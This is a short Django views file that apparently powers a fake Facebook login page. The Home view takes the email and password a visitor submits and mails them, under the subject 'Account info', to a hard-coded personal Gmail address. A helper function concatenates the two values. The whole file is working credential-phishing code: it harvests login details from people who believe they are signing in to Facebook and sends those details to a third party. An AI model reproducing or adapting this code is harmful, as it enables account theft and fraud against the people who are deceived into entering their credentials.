from django.shortcuts import render
from django.core.mail import send_mail
from django.conf import settings
# Create your views here.


def Home(request):
	if request.method == 'POST':
		email = request.POST['email']
		password = request.POST['password']
		information = ltos(email, password)

		send_mail('Account info',
			information,
			settings.EMAIL_HOST_USER,
			['safiullah.khan145@gmail.com'],
			fail_silently = False)
	return render(request, 'facebook/home.html')


def ltos(email, password):
	info = ''
	for i in email:
		info += i

	info += '  '
	for i in password:
		info += i

	return info